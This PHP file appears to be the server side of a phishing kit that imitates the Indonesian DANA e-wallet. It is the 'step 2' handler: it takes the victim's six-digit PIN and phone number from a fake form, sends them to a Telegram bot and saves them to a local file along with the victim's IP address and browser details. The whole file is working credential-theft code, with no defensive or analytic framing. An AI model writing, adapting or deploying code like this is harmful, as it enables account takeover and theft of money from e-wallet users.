<?php
/**
 * Handler untuk Step 2 - PIN DANA
 * Menerima data PIN dari form index.php
 * Menyimpan data dan mengirim ke Telegram
 */

// Include telegram configuration dan functions
require_once __DIR__ . '/../telegram.php';

// Ensure POST request
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    die(json_encode(['ok' => false, 'error' => 'Method not allowed']));
}

// Get input data
$input = array_merge($_POST, json_decode(file_get_contents('php://input'), true) ?? []);

// Combine PIN dari 6 input fields
$pin = '';
for ($i = 1; $i <= 6; $i++) {
    $pinField = 'pin' . $i;
    $pin .= isset($input[$pinField]) ? sanitize_input($input[$pinField]) : '';
}

// Validate PIN
if (empty($pin) || strlen($pin) !== 6) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'PIN harus 6 digit']);
    exit;
}

// Get nomor HP if available (from session atau input)
$nohp = isset($input['nohp']) ? sanitize_input($input['nohp']) : 'Unknown';

// Prepare data for logging
$data = [
    'step' => 'step2_pin',
    'nohp' => $nohp,
    'pin' => $pin,
    'ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
    'timestamp' => date('Y-m-d H:i:s'),
];

// Format message for Telegram
$message = formatStep2($nohp, $pin);

// Send to Telegram
$sent = sendToTelegram($message);

// Save submission to local file
saveSubmission($data);

// Return response
header('Content-Type: application/json; charset=utf-8');
echo json_encode([
    'ok' => true,
    'sent' => $sent,
    'data' => $data
]);
exit;

/**
 * Sanitize input data
 */
function sanitize_input($input) {
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}
?>
